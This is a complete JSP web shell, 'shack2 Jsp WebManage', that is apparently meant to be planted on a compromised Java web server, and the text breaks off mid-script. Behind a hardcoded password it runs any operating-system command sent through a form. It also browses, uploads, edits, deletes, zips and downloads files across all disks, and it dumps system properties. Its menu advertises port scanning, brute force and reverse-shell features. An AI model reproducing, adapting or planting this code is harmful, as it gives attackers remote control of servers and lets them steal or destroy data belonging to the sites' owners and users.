<%@page import="java.text.DecimalFormat"%>
<%@page import="java.io.BufferedWriter"%>
<%@page import="java.io.OutputStreamWriter"%>
<%@page import="java.util.Properties"%>
<%@page import="java.util.ArrayList"%>
<%@page import="java.util.zip.ZipOutputStream"%>
<%@page import="java.util.zip.ZipEntry"%>
<%@page import="java.io.FileInputStream"%>
<%@page import="java.io.UnsupportedEncodingException"%>
<%@page import="java.io.FileOutputStream"%>
<%@page import="java.util.HashMap"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.BufferedInputStream"%>
<%@page import="java.io.OutputStream"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.io.DataInputStream"%>
<%@page import="java.util.Date"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.File"%>
<%@page import="java.util.Iterator"%>
<%@page import="java.util.Map"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%!
private static final String PASS = "shack2";//password
private static final String VERSION = "V1.0-20141106";
private static final String[] Encodings = {"UTF-8","GB2312","GBK","ISO-8859-1","ASCII","Big5"};
private static final String REQUEST_ENCODING = "ISO-8859-1";
private static final String PAGE_ENCODING = "UTF-8";
/*工具类*/
public static class Util{
	
	public static boolean isEmpty(String val){
		if(val==null||"".equals(val)){
			return true;
		}
		return false;
	}
	public static String execCmd(String cmd){
		
		String result="";
		String[] rmd=cmd.split(" ");
		String[] cmds =new String[rmd.length+2];
		String OS = System.getProperty("os.name");
		if (OS.startsWith("Windows")) {
			cmds[0]="cmd";
			cmds[1]="/c";
		}
		else {
			cmds[0]="/bin/sh";
			cmds[1]="-c";
		}
		for(int i=0;i<rmd.length;i++){
			cmds[i+2]=rmd[i];
		}
		try{
		Process p = Runtime.getRuntime().exec(cmds);
		OutputStream os = p.getOutputStream();
		BufferedInputStream in = new BufferedInputStream(p.getInputStream());
		BufferedReader br = new BufferedReader(new InputStreamReader(in));
		DataInputStream dis = new DataInputStream(in);
		String disr = br.readLine();
		while ( disr != null ) {
		 	result+=disr+"<br/>";
		    disr = br.readLine();
		}
		if (p.waitFor() != 0){
			
			in = new BufferedInputStream(p.getErrorStream());
			br = new BufferedReader(new InputStreamReader(in));
			dis = new DataInputStream(in);
			disr = br.readLine();
			while ( disr != null ) {
			 	result+=disr+"<br/>";
			    disr = br.readLine();
			}
		}
		}catch(Exception e){
			result=e.getMessage();
		}
		return result.replaceAll("\\r\\n", "<br/>");
	}
	
	public static String formatPath(String path){
		if(isEmpty(path)){
			return "";
		}
		return path.replaceAll("\\\\","/").replace('\\', '/').replaceAll("//", "/");
	}
	
	public static String formatDate(long time) {
		SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		return format.format(new Date(time));
	}
	//获取参数值
	public static String getRequestStringVal(HttpServletRequest request,String key){
		String val=request.getParameter(key);
		if(!isEmpty(val)){
			return val;
		}
		return "";
	}
	public static int getRequestIntVal(HttpServletRequest request,String key){
		String val=getRequestStringVal(request,key);
		int v=0;
		try{
			v=Integer.parseInt(val);
		}catch(Exception e){

		}
		return v;
	}
	//
	
	public static void print(JspWriter out,int level,String info) throws Exception{
		try{
		if(level==0){
			out.print("<font>"+info+"</font>");
		}
		else if(level==1){
			out.print("<font color=\"yellow\">"+info+"</font>");
		}
		else if(level==2){
			out.print("<font color=\"red\">"+info+"</font>");
		}
		}catch(Exception e){
			throw e;
		}
	}
}

/**
 *将文件或是文件夹打包压缩成zip格式
 * 
 */
public static class ZipUtils {    
   /**
     * 创建ZIP文件
     * @param sourcePath 文件或文件夹路径(多个请用逗号隔开)
     * @param zipPath 生成的zip文件存在路径（包括文件名）
     */
    public static void createZip(String sourcePath, String zipPath) {
        FileOutputStream fos = null;
        ZipOutputStream zos = null;
        try {
            fos = new FileOutputStream(zipPath);
            zos = new ZipOutputStream(fos);
            String[] fs=sourcePath.split(",");
            for(int i=0;i<fs.length;i++){
            	writeZip(new File(fs[i]), "", zos);	
            }
        } catch (Exception e) {
            
        } finally {
            try {
                if (zos != null) {
                    zos.close();
                }
            } catch (IOException e) {
                
            }

        }
    }
    
    private static void writeZip(File file, String parentPath, ZipOutputStream zos) {
        if(file.exists()){
            if(file.isDirectory()){//处理文件夹
                parentPath+=file.getName()+File.separator;
                File [] files=file.listFiles();
                for(int i=0;i<files.length;i++){
                	File f=files[i];
                    writeZip(f, parentPath, zos);
                }
            }else{
                FileInputStream fis=null;
                try {
                    fis=new FileInputStream(file);
                    ZipEntry ze = new ZipEntry(parentPath + file.getName());
                    zos.putNextEntry(ze);
                    byte [] content=new byte[1024];
                    int len;
                    while((len=fis.read(content))!=-1){
                        zos.write(content,0,len);
                        zos.flush();
                    }
                  
                } catch (Exception e) {
                    
                }finally{
                    try {
                        if(fis!=null){
                            fis.close();
                        }
                    }catch(IOException e){
                    }
                }
            }
        }
    }
}

public static class FileUtil{
	
	public static String getFileSize(long size){
    	DecimalFormat df = new DecimalFormat("#.00");
    	if(size<1024){
    		return size+"Byte";
    	}
    	else if(size<(1024*1024)){
    		
    		return df.format((double)(size/1024))+"KB";
    	}
    	else if (size<(1024*1024*1240)){
    		return df.format((double)(size/1024/1024))+"M";
    	}
    	else{
    		return df.format((double)(size/1024/1024/1024))+"G";
    	}	
    }
	//递归删除文件
	public static boolean deleteFile(String path){

		File f=new File(path);
		if(f.isDirectory()){
			File[] fs=f.listFiles();
			for(int i=0;i<fs.length;i++){
				if(fs[i].isDirectory()){
					deleteFile(fs[i].getPath());
				}
				fs[i].delete();
			}
		}
		return f.delete();
	}
	
public static String  writeTextToFile(String text,String path,String encode){
	String msg="";
		try {

			
			OutputStreamWriter osw = null;
			if(Util.isEmpty(encode)){
				osw=new OutputStreamWriter(new FileOutputStream(path));
			}
			else{
				osw=new OutputStreamWriter(new FileOutputStream(path),encode);
			}
			BufferedWriter bw=new BufferedWriter(osw);
			bw.write(text);

			bw.flush();
			bw.close();
			osw.close();
			msg="保存成功！";
		} catch (Exception e) {
	
			msg="保存异常----"+e.getMessage();
		} 
		return msg;
		
		
	}	
	public static String readFileToString(String path,String encoding){
		OutputStream os=null;
		FileInputStream fis=null;
		InputStreamReader isr=null;
		String result="";
		try {
			String fname=path.substring(path.lastIndexOf("/")+1);
			File f=new File(path);
		    fis=new FileInputStream(path);
		    if(Util.isEmpty(encoding)){
				isr=new InputStreamReader(fis);
			}
			else{
				isr=new InputStreamReader(fis,encoding);
			}
			BufferedReader br=new BufferedReader(isr);
		
			String tem=null;
		    while((tem=br.readLine())!=null){
		    	
		    	result+=(tem+"\r\n");
		    }
		    br.close();
		    isr.close();
		    fis.close();
		}catch(Exception e){
			result="文件读取错误！"+e.getMessage();
		}
		return result.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
	} 
	
	public static void newFile(String path,String isDir) throws Exception{
		
		File f=new File(path);
		if(!f.exists()){
		if("1".equals(isDir)){
			f.mkdir();
		}
		else{
			f.createNewFile();
		}
		}
	}
	
	public static void downLoadFile(HttpServletResponse response,String path){
		OutputStream os=null;
		FileInputStream fis=null;
		BufferedInputStream bis=null;
		try {
			String fname=path.substring(path.lastIndexOf("/")+1);
			File f=new File(path);
			os= response.getOutputStream();    
		    
		    response.reset();
		    response.setHeader("Content-Disposition", "attachment; filename="+fname);
		    response.setContentType("application/octet-stream; charset=UTF-8");
		    fis=new FileInputStream(path);
		    bis=new BufferedInputStream(fis);
		    byte[] tem=new byte[4068];
		    int len=0;
		    while((len=bis.read(tem))!=-1){
		        	os.write(tem,0,len);
		    }
		    
		}catch(Exception e){}
		finally {
			try{
			if(bis!=null) bis.close();
			if(fis!=null)fis.close();
		    
		     if (os != null) {
		    	os.flush();
		        os.close();
		    }
			}catch(Exception e){}
		}
	}
	
}

/*上传类*/
public static class UploadFile {

    /**
     * 上传文件组件，调用该方法的servlet在使用该方法前必须先调用request.setCharacterEncoding()方法，设置编码格式。该编码格式须与页面编码格式一致。
     * @param sis 数据流
     * @param encoding 编码方式。必须与jsp页面编码方式一样，否则会有乱码。
     * @param length 数据流长度
     * @param upLoadPath 文件保存路径
     * @throws FileNotFoundException
     * @throws IOException
     */
    public static HashMap uploadFile(ServletInputStream sis, String encoding, int length, String upLoadPath) throws IOException {
        HashMap paramMap = new HashMap();

        boolean isFirst = true;
        String boundary = null;//分界符
        byte[] tmpBytes = new byte[4096];//tmpBytes用于存储每行读取到的字节。
        int[] readBytesLength = new int[1];//数组readBytesLength中的元素i[0]，用于保存readLine()方法中读取的实际字节数。
        int readStreamlength = 0;//readStreamlength用于记录已经读取的流的长度。
        String tmpString = null;

        tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
        readStreamlength = readStreamlength + readBytesLength[0];
        while (readStreamlength < length) {
            if (isFirst) {
                boundary = tmpString;
                isFirst = false;
            }
            if (tmpString.equals(boundary)) {
                String contentDisposition = readLine(tmpBytes, readBytesLength, sis, encoding);
                readStreamlength = readStreamlength + readBytesLength[0];
                String contentType = readLine(tmpBytes, readBytesLength, sis, encoding);
                readStreamlength = readStreamlength + readBytesLength[0];
                //当时上传文件时content-Type不会是null
                if (contentType != null && contentType.trim().length() != 0) {
                    String paramName = getPramName(contentDisposition);
                    String fileName = getFileName(getFilePath(contentDisposition));

                    paramMap.put(paramName, fileName);

                    //跳过空格行
                    readLine(tmpBytes, readBytesLength, sis, encoding);
                    readStreamlength = readStreamlength + readBytesLength[0];

                    /*
                     * 文件名不为空，则上传了文件。
                     */
                    if (fileName != null && fileName.trim().length() != 0) {
                        fileName = upLoadPath + fileName;

                        //开始读取数据
                        byte[] cash = new byte[4096];
                        int flag = 0;
                        FileOutputStream fos = new FileOutputStream(fileName);
                        tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                        readStreamlength = readStreamlength + readBytesLength[0];
                        /*
                         *分界符跟结束符虽然看上去只是结束符比分界符多了“--”，其实不是，
                         *分界符是“-----------------------------45931489520280”后面有2个看不见的回车换行符，即0D 0A
                         *而结束符是“-----------------------------45931489520280--”后面再跟2个看不见的回车换行符，即0D 0A
                         *
                         */
                        while (tmpString.indexOf(boundary.substring(0, boundary.length() - 2)) == -1) {
                            for (int j = 0; j < readBytesLength[0]; j++) {
                                cash[j] = tmpBytes[j];
                            }
                            flag = readBytesLength[0];
                            tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                            readStreamlength = readStreamlength + readBytesLength[0];
                            if (tmpString.indexOf(boundary.substring(0, boundary.length() - 2)) == -1) {
                                fos.write(cash, 0, flag);
                                fos.flush();
                            } else {
                                fos.write(cash, 0, flag - 2);
                                fos.flush();
                            }
                        }
                        fos.close();
                    } else {
                        //跳过空格行
                        readLine(tmpBytes, readBytesLength, sis, encoding);
                        readStreamlength = readStreamlength + readBytesLength[0];

                        //读取分界符或者结束符
                        tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                        readStreamlength = readStreamlength + readBytesLength[0];
                    }
                } //当不是长传文件时
                else {
                    String paramName = getPramName(contentDisposition);
                    String value = readLine(tmpBytes, readBytesLength, sis, encoding);
                    //去掉回车换行符(最后两个字节)
                    byte[] valueByte=value.getBytes(encoding);
                    value =new String(valueByte, 0, valueByte.length-2, encoding);
                    
                    readStreamlength = readStreamlength + readBytesLength[0];
                    paramMap.put(paramName, value);
                    tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                    readStreamlength = readStreamlength + readBytesLength[0];
                }
            }

        }
        sis.close();
        return paramMap;
    }

    /**
     * 从流中读取一行数据。
     * @param bytes 字节数组，用于保存从流中读取到的字节。
     * @param index 一个整型数组，只有一个元素，即index[0],用于保存从流中实际读取的字节数。
     * @param sis 数据流
     * @param encoding 组建字符串时所用的编码
     * @return 将读取到的字节经特定编码方式组成的字符串。
     */
    private static String readLine(byte[] bytes, int[] index, ServletInputStream sis, String encoding) {
        try {
            index[0] = sis.readLine(bytes, 0, bytes.length);//readLine()方法把读取的内容保存到bytes数组的第0到第bytes.length处，返回值是实际读取的 字节数。
            if (index[0] < 0) {
                return null;
            }
        } catch (IOException e) {
            return null;
        }
        if (encoding == null) {
            return new String(bytes, 0, index[0]);
        } else {
            try {
                return new String(bytes, 0, index[0], encoding);
            } catch (Exception ex) {
                return null;
            }
        }

    }

    private static String getPramName(String contentDisposition) {
        String s = contentDisposition.substring(contentDisposition.indexOf("name=\"") + 6);
        s = s.substring(0, s.indexOf('\"'));
        return s;
    }

    private static String getFilePath(String contentDisposition) {
        String s = contentDisposition.substring(contentDisposition.indexOf("filename=\"") + 10);
        s = s.substring(0, s.indexOf('\"'));
        return s;
    }

    private static String getFileName(String filePath) {
        String rtn = null;
        if (filePath != null) {
            int index = filePath.lastIndexOf("/");//根据name中包不包含/来判断浏览器的类型。
            if (index != -1)//包含/，则此时可以判断文件由火狐浏览器上传
            {
                rtn = filePath.substring(index + 1);//获得文件名
            } else//不包含/,可以判断文件由ie浏览器上传。
            {
                index = filePath.lastIndexOf("\\");
                if (index != -1) {
                    rtn = filePath.substring(index + 1);//获得文件名
                } else {
                    rtn = filePath;
                }
            }
        }
        return rtn;
    }
}
%>
<%
request.setCharacterEncoding(PAGE_ENCODING);
//shell所在磁盘路径
final String shellPath=request.getContextPath()+request.getServletPath();

//shell磁盘更目录
String webRootPath=request.getSession().getServletContext().getRealPath("/");

if (Util.isEmpty(webRootPath)) {//for weblogic
	webRootPath = Util.formatPath(this.getClass().getClassLoader().getResource("/").getPath());
	webRootPath = webRootPath.substring(0,webRootPath.indexOf("/WEB-INF"));
	webRootPath=webRootPath.substring(0,webRootPath.lastIndexOf("/"));
} else {
	webRootPath = application.getRealPath("/");
}
webRootPath=Util.formatPath(webRootPath);
final String shellDir=webRootPath+request.getContextPath();

String m=Util.getRequestStringVal(request, "m");
if(Util.isEmpty(m)){
	m="FileManage";
}
//登录密码验证

if("Login".equals(m)){
	String dow=Util.getRequestStringVal(request, "do");
	if(Util.isEmpty(dow)){
		%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>shack2 Jsp WebManage Login</title>
<style type="text/css">
body{
font-size:12px;
color:#464646;
margin:0px;
padding:10px;
background-color:#fbfbfb;
border-collapse: collapse;
}
div{
line-height:30px;
}
input{
vertical-align:middle;
}
</style>

</head>

<body>
<div>
<form action="<%=shellPath %>?m=Login&do=DoLogin" method="post" enctype="application/x-www-form-urlencoded" name="loginForm">
请输入密码：<input type="password" name="pass" /><input name="" type="submit" value="登录" />
</form>
<%
String info=Util.getRequestStringVal(request, "info");
if("false".equals(info)){
	Util.print(out,2,"密码错误，嘎嘎！");
}
%>
</div>
<div style="border-bottom:2px #ccc solid;">Copyright (c) 2014 <a href="http://www.shack2.org">http://www.shack2.org</a> All Rights Reserved| coded by shack2 QQ：1341413415| power by shack2 Jsp WebManage| version:<%=VERSION%></div>
</body>
</html><%
	}
	if("DoLogin".equals(dow)){
		String pass=Util.getRequestStringVal(request, "pass");
		if(PASS.equals(pass)){
			session.setAttribute("isLogin", "true");
			response.sendRedirect(shellPath+"?m=FileManage");
		}
		else{
			response.sendRedirect(shellPath+"?m=Login&info=false");
		}
	}
	//阻止下面的内容输出
	return;
}
else{
	
	//登录状态验证
	String isLogin=session.getAttribute("isLogin")+"";
	if(!"true".equals(isLogin)){
		response.sendRedirect(shellPath+"?m=Login");
	}
}
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<style type="text/css">
body{
font-size:12px;
color:#464646;
margin:0px;
padding:0px;
}
#menue{
height:30px;
background:#efefef;
overflow:hidden;
margin:0px auto;
width:1000px;
padding:0px 10px 0px 10px;
border-bottom:1px solid #222;
text-align:center;
}
#menue a{
text-decoration:none;
color:#fff;
padding:6px 10px 6px 10px;
letter-spacing:2px;
height:24px;
line-height:24px;
font-weight:bold;
}
ul,li,font,dd,dl{padding:0px;margin:0px}
#content{
line-height:20px;
padding:10px;
overflow:hidden;
margin:0px auto;
width:1000px;
color:#464646;
background:#f8f8f8;
}
#content div{
line-height:20px;
}
/*EnvsInfo*/
#EnvsInfo{
padding:10px;
}
#EnvsInfo li{
line-height:25px;
}
/*FileManage css*/
#filesList dd,font{
float:left;
text-align:left;
}
.fileName{
width:370px;
display:block;
white-space:nowrap;
overflow:hidden;
text-overflow:ellipsis;
}
.fileUpdateTime,.filePermis{
width:140px;
}
.fileSize{
width:120px;}
.fileDo a{
margin-left:10px;
color:#464646;
}

#filesList div{
height:30px;
padding:0px 5px 0px 5px;;
line-height:30px;
border-bottom:1px solid #ccc;
background:#fcfcfc;
}
#filesList a{
height:30px;
line-height:30px;
color:#464646;
}
#filesList input{
margin:0px;padding:0px;
margin-right:5px;
vertical-align:text-top;
}
#diskInfo{
clear:both;
height:30px;
line-height:30px;
}
#diskInfo a{
height:30px;
line-height:30px;
color:#555;
margin-right:5px;
}
#filesInfo{
padding:5px;
}
#filesInfo a{
margin-right:10px;
color:#464646;
}
#CMDS input{
margin:0px;
vertical-align:middle;
}

/*CMD*/
#execResult{
line-height:25px;
}

/*bottom*/
.bottom{
clear:both;
color:#fff;
width:1000px;
margin:0px auto;
padding:10px;
height:25px;
line-height:25px;
background:#888;
text-align:center;
}
.bottom a{
color:#fff;
height:25px;
line-height:25px;
li
}
#fileListTop div{
float:left;
}
</style>
<script type="text/javascript">
function post(url,data){
	var op=document.getElementById("postForm");
	if(op!=null){
		document.body.removeChild(op);
	}
	var pForm = document.createElement("form");
	pForm.id="postForm";
	document.body.appendChild(pForm);  
	pForm.method = "post";  
	pForm.action = url;
	for(var x in data){
		var input = document.createElement("input");  
		input.setAttribute("name",x);
		input.setAttribute("type","hidden");
		input.setAttribute("value",data[x]);
		pForm.appendChild(input);
	}
	pForm.submit();
}
</script>
</head>
<body>
<div>
	<!--top-->
	<div style="background-color:#efefef;height:22px;padding:5px 0px 0px 5px; border-bottom:2px #000 solid;text-align:center">
	Web:localhost:8000 主机IP：192.168.11.11 |shack2 Jsp WebManage coded by shack2 QQ：1341413415| http://www.shack2.org | version:<%=VERSION%> mark:本脚本适用于简单的Web管理，为了兼容较低版本JDK，采用JDK1.3开发
	</div>
	<!--menue-->
	<div id="menue">
	<a href="javascript:post('<%=shellPath%>',{m:'EnvsInfo'})" name="EnvsInfo">环境信息</a><a href="javascript:post('<%=shellPath%>',{m:'FileManage'})" name="FileManage">文件管理</a><a href="javascript:post('<%=shellPath%>',{m:'CMDS'})" name="CMDS">命令执行</a><a href="javascript:void(0)">数据库管理</a><a href="javascript:void(0)">端口扫描</a><a href="javascript:void(0)">暴力破解</a><a href="javascript:void(0)">反弹控制</a><a href="javascript:void(0)">远程文件下载</a><a href="javascript:void(0)">远程控制</a><a href="http://www.shack2.org">帮助</a><a href="http://www.shack2.org">更新</a><a href="http://www.shack2.org">bug反馈</a><a href="javascript:void(0)">退出</a>
	</div>
	<!--content-->
	<div id="content">
		<%
		if("EnvsInfo".equals(m)){
		%>
		<!--环境信息-->
		<div id="EnvsInfo">
			<ul>
				<%
				Properties ps=System.getProperties();
				Iterator iter=ps.keySet().iterator();
				while (iter.hasNext()) {
					String key=iter.next()+"";
					out.print("<li>"+key+"&nbsp;&nbsp;"+ps.getProperty(key)+"</li>");
				}
				%>
				
			</ul>
		</div>
		<%
		}
		%>
		
		<%	
		//文件管理
		if("FileManage".equals(m)){
			String dow=Util.getRequestStringVal(request, "do");
			String path=Util.getRequestStringVal(request, "path");
			if("upload".equals(dow)){
				if(!Util.isEmpty(path)){
					UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader("Content-Length")),path);
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+path+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
			}
			if("newFile".equals(dow)){
				if(!Util.isEmpty(path)){
					String isDir=Util.getRequestStringVal(request, "isDir");
					String fname=Util.getRequestStringVal(request, "fileName");
					FileUtil.newFile(path+"/"+fname,isDir);
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+path+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
			}
			else if("packFiles".equals(dow)){
				if(!Util.isEmpty(path)){
					String files=Util.getRequestStringVal(request, "files");
					String zipName=Util.getRequestStringVal(request, "zipName");
					String toPath="";
					if(Util.isEmpty(files)){
						File f=new File(path);
						ZipUtils.createZip(path, Util.formatPath(f.getParent())+"/"+zipName+".zip");
					}
					else{
							//打包多个文件
						toPath=path;
						ZipUtils.createZip(files, path+"/"+zipName+".zip");
					}
					
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+toPath+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
			}
			else if("editFile".equals(dow)){
				String encoding=Util.getRequestStringVal(request, "encode");
				String result="";
				String msg="";
				String content=Util.getRequestStringVal(request, "content");
				if(!Util.isEmpty(content)){
					msg=FileUtil.writeTextToFile(content, path, encoding);
					result=content;
				}
				else{
					result=FileUtil.readFileToString(path,encoding);
				}
				%>
				<div class="editFile">
				<form name="editFileForm" enctype="application/x-www-form-urlencoded" method="post" action="">
					<input type="hidden" value="FileManage" name="m" />
					<input type="hidden" value="editFile" name="do" />
					<input type="hidden" value="<%=path %>" name="path" />
					<div>
					<select name="encode" onchange="changeEncode(this,'<%=path%>')">
					<option value="">默认</option>
					<%
					for(int i=0;i<Encodings.length;i++){
						if(!Encodings[i].equals(encoding)){
							out.print("<option>"+Encodings[i]+"</option>");
						}
						else{
							out.print("<option selected=\"selected\">"+Encodings[i]+"</option>");
						}
					}
					%>
					</select><%=msg %>
					<input type="submit" value="保存"/>
					</div>
					
				
				<div id="fileText"><textarea name="content" style="height:400px;width:100%"><%=result %></textarea></div>
				</form>
				</div>
				<%
			}
			else if("delete".equals(dow)){
				if(!Util.isEmpty(path)){
					File f=new File(path);
					String ppath=Util.formatPath(f.getParent());
					
					//删除多个
					String files=Util.getRequestStringVal(request, "files");
					if(!Util.isEmpty(files)){
						String[] filesarry=files.split(",");
						for(int i=0;i<filesarry.length;i++){
							FileUtil.deleteFile(filesarry[i]);
						}
						ppath=path;
					}else{
						FileUtil.deleteFile(path);
					}
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+ppath+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
				
			}
			else if("downFile".equals(dow)){
				if(!Util.isEmpty(path)){
					File f=new File(path);
					FileUtil.downLoadFile(response, path);
				}
				
			}
			else if(Util.isEmpty(dow)){
				int dirCount=0;
				int fCount=0;
				String dir=Util.getRequestStringVal(request, "dir");
				if(Util.isEmpty(dir)){
					//显示根目录文件列表
					dir=webRootPath;
				}
				dir=Util.formatPath((dir+"/"));				
				File f=new File(dir);
				%>
				<!--文件管理-->
		<div id="FileManage">
			<div id="fileListTop">
				<div>
					<form action="<%=shellPath%>" method="post" enctype="application/x-www-form-urlencoded" name="turnDir">当前磁盘路径：<input style="width:390px;height:18px" id="currentDir" name="dir" type="text" value="<%=dir%>" /><input value="转到" type="button" onclick="goTargetPath(0)" /></form><form action="<%=shellPath %>?m=FileManage&do=upload&path=<%=dir%>" method="post" enctype="multipart/form-data">
				</div>
				<div>
				&nbsp;&nbsp;文件上传：<input name="path" type="hidden" value="<%=dir%>"/><input name="m" value="FileManage" type="hidden" /><input name="do" value="upload" type="hidden" /><input name="upFile" type="file" /><input type="submit" value="上传" />&nbsp;&nbsp;<input value="跳到上级目录" onclick="goTargetPath(1)" type="button" /></form>
				</div>
			</div>
			<!--磁盘列表-->
			<div id="diskInfo">
					<%	
				File[] rfs=f.listRoots();
				
				if(f.exists()){
					for(int i=0;i<rfs.length;i++){
						File cf=rfs[i];
						
						%>
						<a href="javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})">磁盘(<%=cf.getPath() %>)</a>
						<%
				}
				%>
				<a href="javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=webRootPath%>'})">|Web根目录|</a><a href="javascript:newFile('1','<%=dir%>')">|新建文件夹|</a><a href="javascript:newFile('0','<%=dir%>')">|新建文件|</a>
			</div>
			<!--文件目录列表-->
			<div id="filesList">
			<div><dd class="fileName">文件名称</dd><dd class="fileUpdateTime">上次修改时间</dd><dd class="filePermis">可读/可写</dd><dd class="fileSize">文件大小</dd><dd class="fileDo">&nbsp;&nbsp;&nbsp;操作</dd></div>
			<%
			//显示文件列表
			
				File[] fs=f.listFiles();
				
				for(int i=0;i<fs.length;i++){
					File cf=fs[i];
					if(cf.isFile()){
						fCount++;
					}
					else{
						dirCount++;
					}
					%>
					<%
					String currentPath=Util.formatPath(dir+cf.getName());
					%>
					<div>
					<dd class="fileName"><input type="checkbox" value="<%=currentPath%>"/><a title="<%=cf.getName()%>" href="<%if(cf.isDirectory()){out.print("javascript:post('"+shellPath+"',{m:'FileManage',dir:'"+dir+cf.getName()+"'})");}else{out.print("javascript:void(0)");}%>"><%=cf.getName()%></a></dd>
					<dd class="fileUpdateTime"><%=Util.formatDate(cf.lastModified())%></dd>
					<dd class="filePermis"><%=cf.canRead() %>/<%=cf.canWrite()%></dd>
					<dd class="fileSize"><%=FileUtil.getFileSize(cf.length())%></dd>
					<dd class="fileDo">
					<%if(cf.isFile()){%><a href="javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})">编辑</a><%}%>
					<%if(cf.isFile()){%><a href="javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})">下载</a><%}%>
					<!-- <a href="#">复制</a>
					<a href="#">属性</a> -->
					<a href="javascript:packFiles('<%=currentPath%>')">打包</a>
					<a href="javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})">删除</a>
					</dd></div>
					
					<%
				}
			}
			else{
				Util.print(out, 1, dir+"不存在！");
			}
			%>		
			</div>
			<!--文件目录列表end-->
			<!--文件信息结束-->
			<div id="filesInfo"><a href="javascript:checkAll()">全选</a><a href="javascript:revsAll()">反选</a><a href="javascript:delSelectFiles('<%=dir %>')">删除选中项</a><a href="javascript:packSelectFiles('<%=dir%>')">打包选中项</a> 总计<%=dirCount %>文件夹，<%=fCount %>个文件</div>
			<!--文件结束-->
		</div>
		<!--文件管理结束-->
				
				<%
				
				
			}
		}
		%>
		<%
		if("CMDS".equals(m)){
			String cmd=Util.getRequestStringVal(request, "cmd");
			String result="";
			if(!Util.isEmpty(cmd)){
				result=Util.execCmd(cmd);
			}
			%>
			
			<!--执行命令开始-->
		<div id="CMDS">
			<form action="<%=shellPath %>" method="post" enctype="application/x-www-form-urlencoded">
				输入命令：<input name="cmd" value="<%=cmd%>" style="width:300px" type="text" /><input name="m" value="CMDS" type="hidden" /><input value="执行" type="submit" />
			</form>
			<div id="execResult"><%=result%></div>
		</div>
		<!--执行命令结束-->
			<%
		}
		%>		
		
	</div>
	<!--内容结束-->
	<div class="bottom">Copyright (c) 2014 <a href="http://www.shack2.org">http://www.shack2.org</a> All Rights Reserved| coded by shack2 QQ：1341413415| power by shack2 Jsp WebManage| version:<%=VERSION%></div>
</div>
<script type="text/javascript">
var menue=document.getElementById("menue");
 
var menues=menue.getElementsByTagName("a");

for(var i=0;i<menues.length;i++)
{
	menues[i].style.backgroundColor="#"+Math.floor(Math.random()*499999+500000);
	
}
//filesManage鼠标in out
var fdiv=document.getElementById("filesList");
var fsdiv=fdiv.getElementsByTagName("div");

for(var i=0;i<fsdiv.length;i++){
	fsdiv[i].onmouseover=function(){
		this.style.backgroundColor="#F5F2E8";
	};
	fsdiv[i].onmouseout=function(){
		this.style.backgroundColor="#fcfcfc";
	}; 
}
var ms=document.getElementById("menue").getElementsByTagName("a");
var mdivs=document.getElementById("content").getElementsByTagName("div");

for(var i=0;i<ms.length;i++){
	if(ms[i].name!=""){
		ms[i].onclick=function(){
			for(var j=0;j<ms.length;j++){		
				if(ms[j].name!=""){
					document.getElementById(ms[j].name).style.display="none";
				}
			}
			document.getElementById(this.name).style.display="block";
		};
	}
}
function goTargetPath(type){
	var dir=document.getElementById("currentDir").value;
	dir=dir.replace("//","/");
	if(type==1){
		var l=dir.lastIndexOf("/");
		dir=dir.substr(0,l);
		l=dir.lastIndexOf("/");
		dir=dir.substr(0,l);
	}
	post('<%=shellPath%>',{'m':'FileManage','dir':dir});
}
function changeEncode(code,path){
	var encode=code.value;
	post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':path,'encode':encode});
}
function newFile(isDir,currentDir){
	var name = prompt('请输入目录名或文件名！','');
	if (name == null || name.trim().length == 0){
		alert("输入错误！");
		return;
	}
	post('<%=shellPath%>',{'m':'FileManage','do':'newFile','path':currentDir,'isDir':isDir,'fileName':name});
}
function packFiles(path){
	var zipName = prompt('请输入压缩文件名！','');
	if (zipName == null || zipName.trim().length == 0){
		alert("输入错误！");
		return;
	}
	post('<%=shellPath%>',{'m':'FileManage','do':'packFiles','path':path,'zipName':zipName});
}

function getSelect()
{
	var inputs=document.getElementById("filesList").getElementsByTagName("input");
	var s="";
	for(var i=0;i<inputs.length;i++){
	    	if(inputs[i].checked){   		
	    		s=s+inputs[i].value+",";
	    	}
	}
	if(s.length>1){
